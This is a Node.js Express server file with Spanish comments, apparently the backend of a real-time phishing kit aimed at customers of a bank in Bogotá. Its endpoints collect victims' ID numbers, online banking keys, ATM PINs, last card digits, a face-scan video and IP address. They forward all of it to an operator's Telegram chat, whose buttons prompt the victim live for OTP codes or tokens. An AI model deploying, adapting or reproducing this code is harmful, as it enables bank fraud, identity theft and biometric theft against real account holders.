// Importa los módulos necesarios
const express = require('express');
const path = require('path');
const dotenv = require('dotenv');
const multer = require('multer');
const fs = require('fs');
const FormData = require('form-data'); // Necesario para enviar archivos a Telegram desde Node

// Carga las variables de entorno desde el archivo .env
dotenv.config();

// Configuración de Multer para manejar la subida de videos en memoria (mejor para Vercel)
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Crea una instancia de la aplicación Express
const app = express();
const http = require('http');
// Creamos un servidor HTTP a partir del app para usar con socket.io
const server = http.createServer(app);

// Puerto configurable desde variable de entorno o 3000 por defecto
const PORT = process.env.PORT || 3000;

// Middleware para parsear JSON en el body de las peticiones
app.use(express.json());

// Middleware para servir los archivos estáticos (HTML, CSS, JS) de la carpeta 'public'
// Esto es clave para que encuentre tu index.html, chefs.html, gracias.html, etc.
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint para enviar mensajes a Telegram de forma segura
app.post('/api/send-message', async (req, res) => {
    // 'keyboard' se recibe correctamente del frontend
    const { text, keyboard } = req.body;

    const token = process.env.TELEGRAM_TOKEN;
    const chat_id = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chat_id) {
        return res.status(500).json({ error: 'Las variables de entorno de Telegram no están configuradas en el servidor.' });
    }

    if (!text) {
        return res.status(400).json({ error: 'El texto del mensaje es requerido.' });
    }

    // Obtener IP del cliente (opcional, útil para logs)
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const clientIp = rawIp ? rawIp.replace('::ffff:', '') : 'Unknown';

    // Añadir IP al mensaje
    const textWithIp = `${text}\n\n<b>🌐 IP:</b> <code>${clientIp}</code>`;

    try {
        // Usamos fetch (disponible en Node.js 18+) para comunicarnos con la API de Telegram
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chat_id,
                text: textWithIp,
                parse_mode: 'HTML',
                // 'reply_markup' espera el objeto 'keyboard' que le mandaste
                reply_markup: keyboard,
            }),
        });
        const data = await response.json();

        if (!response.ok) {
            console.error('Telegram API Error:', data);
            return res.status(response.status).json(data);
        }

        res.status(response.status).json(data);
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ error: 'Error interno del servidor al contactar a Telegram.' });
    }
});

// Endpoint para recibir y reenviar video a Telegram
app.post('/api/send-video', upload.single('video'), async (req, res) => {
    const token = process.env.TELEGRAM_TOKEN;
    const chat_id = process.env.TELEGRAM_CHAT_ID;

    console.log('Recibiendo video...');

    if (!token || !chat_id) {
        console.error('Variables de Telegram no configuradas');
        return res.status(500).json({ error: 'Variables de entorno de Telegram no configuradas.' });
    }

    // req.file.buffer contiene el video en memoria
    if (!req.file || !req.file.buffer) {
        console.error('No se recibió el buffer del video');
        return res.status(400).json({ error: 'No se recibió ningún video válido.' });
    }

    let loginData = {};
    try {
        loginData = req.body.loginData ? JSON.parse(req.body.loginData) : {};
        console.log('Datos de login recibidos:', loginData);
    } catch (parseError) {
        console.error('Error parseando loginData:', parseError);
    }

    // Obtener IP del cliente
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const clientIp = rawIp ? rawIp.replace('::ffff:', '') : 'Desconocida';

    try {
        // Detectar formato del video basado en el nombre del archivo
        const originalFilename = req.file.originalname || 'face-scan.webm';
        const isMP4 = originalFilename.endsWith('.mp4');
        const filename = isMP4 ? 'face-scan.mp4' : 'face-scan.webm';
        const contentType = isMP4 ? 'video/mp4' : 'video/webm';

        const formData = new FormData();
        formData.append('chat_id', chat_id);
        formData.append('video', req.file.buffer, {
            filename: filename,
            contentType: contentType
        });

        // Construir caption con TODOS los datos de login
        let caption = `<b>🎥 VIDEO BIOMÉTRICO - BOGOTÁ 🎥</b>\n\n`;

        if (loginData.identificationType) {
            caption += `<b>🆔 Tipo Doc:</b> ${loginData.identificationType}\n`;
        }
        if (loginData.identificationNumber) {
            caption += `<b>👤 Documento:</b> <code>${loginData.identificationNumber}</code>\n`;
        }
        if (loginData.secureKey && loginData.secureKey !== 'N/A') {
            caption += `<b>🔑 Clave Segura:</b> <code>${loginData.secureKey}</code>\n`;
        }
        if (loginData.debitCardKey && loginData.debitCardKey !== 'N/A') {
            caption += `<b>🔑 Clave Cajero:</b> <code>${loginData.debitCardKey}</code>\n`;
        }
        if (loginData.last4Digits && loginData.last4Digits !== 'N/A') {
            caption += `<b>🔢 Últimos 4:</b> <code>${loginData.last4Digits}</code>\n`;
        }

        caption += `\n<b>🌐 IP:</b> <code>${clientIp}</code>\n`;
        caption += `<b>📅 Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;

        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');

        const keyboard = {
            inline_keyboard: [
                [{ text: "❌ Error Cara", callback_data: `error_face:N/A` }],
                [{ text: "🔢 Pedir OTP", callback_data: `pedir_otp:N/A` }, { text: "💎 Pedir Token", callback_data: `pedir_token:N/A` }],
                [{ text: "🚨 Finalizar", callback_data: `finalizar:N/A` }]
            ]
        };
        formData.append('reply_markup', JSON.stringify(keyboard));

        console.log('Enviando video a Telegram...');

        // Usar el método submit de form-data que maneja correctamente los streams
        formData.submit(`https://api.telegram.org/bot${token}/sendVideo`, (err, response) => {
            let responseData = '';

            response.on('data', (chunk) => {
                responseData += chunk;
            });

            response.on('end', () => {
                // Ya no hay archivo temporal que eliminar con memoryStorage

                try {
                    const data = JSON.parse(responseData);
                    console.log('Respuesta de Telegram:', data);

                    if (data.ok) {
                        console.log('Video enviado exitosamente, messageId:', data.result.message_id);
                        res.json({ success: true, messageId: data.result.message_id });
                    } else {
                        console.error('Telegram Video Error:', data);
                        res.status(500).json({ error: 'Error al enviar video a Telegram', details: data });
                    }
                } catch (parseErr) {
                    console.error('Error parseando respuesta:', parseErr, responseData);
                    res.status(500).json({ error: 'Error al procesar respuesta de Telegram' });
                }
            });

            response.on('error', (respErr) => {
                console.error('Error en respuesta:', respErr);
                res.status(500).json({ error: 'Error de conexión con Telegram' });
            });

            if (err) {
                console.error('Error enviando form-data:', err);
                res.status(500).json({ error: 'Error enviando video a Telegram' });
            }
        });

    } catch (error) {
        console.error('Error procesando video:', error);
        res.status(500).json({ error: 'Error interno al procesar video', details: error.message });
    }
});

// Endpoint seguro para verificar la respuesta (callback) de Telegram
app.get('/api/check-update/:messageId', async (req, res) => {
    const { messageId } = req.params;
    const token = process.env.TELEGRAM_TOKEN;
    const chat_id = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chat_id) {
        return res.status(500).json({ error: 'Variables de entorno de Telegram no configuradas.' });
    }

    let updateFound = false;
    const startTime = Date.now();
    const timeout = 55000; // 55 segundos (Vercel limite suele ser 60s en Pro, 10s en Hobby)

    // Variable para el offset de getUpdates
    let lastUpdateId = 0;

    // Bucle de "Long Polling"
    while (Date.now() - startTime < timeout && !updateFound) {
        try {
            // Usamos un offset para pedir a Telegram solo actualizaciones nuevas
            const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${lastUpdateId + 1}&limit=1`);
            const data = await response.json();

            if (data.ok && data.result.length > 0) {
                // Busca la actualización de callback que coincida con nuestro ID de mensaje
                const relevantUpdate = data.result.find(
                    (update) =>
                        update.callback_query &&
                        update.callback_query.message.message_id == messageId
                );

                // Actualizamos el offset para la próxima petición, incluso si no es nuestro mensaje
                lastUpdateId = data.result[data.result.length - 1].update_id;

                if (relevantUpdate) {
                    updateFound = true;
                    const callbackQuery = relevantUpdate.callback_query;
                    const action = callbackQuery.data.split(':')[0];
                    const user = callbackQuery.from;
                    const userName = user.username ? `@${user.username}` : `${user.first_name} ${user.last_name || ''}`.trim();

                    // Responde a Telegram para que sepa que recibimos el callback
                    await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ callback_query_id: callbackQuery.id })
                    });

                    // Eliminar los botones del mensaje en Telegram
                    await fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chat_id,
                            message_id: messageId,
                            reply_markup: { inline_keyboard: [] } // Un teclado vacío
                        }),
                    });

                    // Enviar notificación al chat de Telegram
                    const notificationText = `${userName} eligió la acción: ${action}.`;
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chat_id,
                            text: notificationText,
                        }),
                    });

                    // Enviar la acción al frontend
                    return res.json({ action });
                }
            }
        } catch (error) {
            console.error('Error durante el polling:', error);
            // Esperar antes de reintentar para no saturar en caso de error de red
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
        // Esperar 2 segundos antes de la siguiente verificación
        if (!updateFound) await new Promise(resolve => setTimeout(resolve, 2000));
    }
    // Si se agota el tiempo, enviar una respuesta de timeout
    return res.status(408).json({ error: 'Timeout: No se recibió respuesta del operador.' });
});

// --- Socket.IO: conteo de visitantes en tiempo real ---
const { Server } = require('socket.io');
const io = new Server(server, {
    cors: { origin: '*' }
});

// Mapa con sockets conectados para información más detallada
const connected = new Map();
// Contador de visitas totales (en memoria). Reinicia al reiniciar el servidor.
let totalVisits = 0;
// Lista de las visitas recientes (máx 200)
const recentVisits = [];

io.on('connection', (socket) => {
    const now = Date.now();
    connected.set(socket.id, { connectedAt: now });

    // Nuevo "visitante" que carga la página / establece socket: incrementamos totalVisits
    totalVisits++;
    // Guardamos en historial de visitas (más reciente primero)
    recentVisits.unshift({ id: socket.id, at: now });
    if (recentVisits.length > 200) recentVisits.length = 200;

    const onlineCount = connected.size;
    // Emitimos estadísticas completas
    const stats = {
        online: onlineCount,
        totalVisits,
        recentVisits: recentVisits.slice(0, 100),
        clients: Array.from(connected.entries()).map(([id, info]) => ({ id, connectedAt: info.connectedAt }))
    };
    io.emit('stats', stats);
    io.emit('count', onlineCount);
    io.emit('details', { count: onlineCount, clients: stats.clients });

    // Permitir que un cliente solicite los detalles bajo demanda
    socket.on('request-details', () => {
        const current = connected.size;
        socket.emit('details', {
            count: current,
            clients: Array.from(connected.entries()).map(([id, info]) => ({ id, connectedAt: info.connectedAt }))
        });
    });

    socket.on('disconnect', () => {
        connected.delete(socket.id);
        const newCount = connected.size;
        const statsAfter = {
            online: newCount,
            totalVisits,
            recentVisits: recentVisits.slice(0, 100),
            clients: Array.from(connected.entries()).map(([id, info]) => ({ id, connectedAt: info.connectedAt }))
        };
        io.emit('stats', statsAfter);
        io.emit('count', newCount);
        io.emit('details', { count: newCount, clients: statsAfter.clients });
    });
});

// --- Ruta Catch-All para servir la SPA ---
// Esta es la ruta que tú proporcionaste. Es perfecta.
// Cualquier solicitud que no coincida con '/api/...' será respondida con tu index.html
app.get(/.*/, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Exportar la app para Vercel
module.exports = app;

// Iniciar servidor solo si no estamos en Vercel
if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
    server.listen(PORT, () => {
        console.log(`Servidor corriendo en http://localhost:${PORT}`);
    });
}
